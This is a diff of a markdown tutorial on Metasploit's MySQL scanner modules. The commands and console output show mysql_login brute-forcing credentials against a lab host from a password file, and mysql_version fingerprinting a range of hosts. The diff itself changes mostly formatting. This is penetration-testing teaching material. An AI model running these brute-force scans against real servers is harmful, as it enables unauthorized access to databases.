@@ -1,11 +1,9 @@
 # Scanner MySQL Auxiliary Modules
-***mysql_login***
+# mysql_login
 
 - The mysql_login auxiliary module is a brute-force login tool for MySQL servers.
 
 ```bash 
-msfconsole
-
 msf > use auxiliary/scanner/mysql/mysql_login 
 msf auxiliary(mysql_login) > show options
 
@@ -30,8 +28,9 @@ Module options (auxiliary/scanner/mysql/mysql_login):
    USER_AS_PASS      false                               no        Try the username as the password for all users
    USER_FILE                                             no        File containing usernames, one per line
    VERBOSE           true                                yes       Whether to print output for all attempts
-   ```
+```
    - To configure our scan, we point the module to files containing usernames and passwords, set our RHOSTS value, and let it run.
+   
    
 ```bash
 msf auxiliary(mysql_login) > set PASS_FILE /tmp/passes.txt
@@ -56,6 +55,7 @@ msf auxiliary(mysql_login) > run
 [*] 192.168.1.200:3306 Trying username:'administrator' with password:'admin'
 [*] 192.168.1.200:3306 failed to login as 'administrator' with password 'admin'
 [*] 192.168.1.200:3306 Trying username:'administrator' with password:'god'
+
 [*] 192.168.1.200:3306 failed to login as 'administrator' with password 'god'
 [*] 192.168.1.200:3306 Trying username:'administrator' with password:'s3cr3t'
 [*] 192.168.1.200:3306 failed to login as 'administrator' with password 's3cr3t'
@@ -80,8 +80,10 @@ msf auxiliary(mysql_login) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(mysql_login) >
+
 ```
-***mysql_version***
+# mysql_version
+
 - The mysql_version module, as its name implies, scans a host or range of hosts to determine the version of MySQL that is running.
 
 ```bash
@@ -95,6 +97,7 @@ Module options (auxiliary/scanner/mysql/mysql_version):
    RHOSTS                    yes       The target address range or CIDR identifier
    RPORT    3306             yes       The target port
    THREADS  1                yes       The number of concurrent threads
+
 ```
 - To configure the module, we simply set our RHOSTS and THREADS values and let it run.
 
@@ -120,4 +123,5 @@ msf auxiliary(mysql_version) > run
 [*] Scanned 55 of 55 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(mysql_version) >
+
 ```
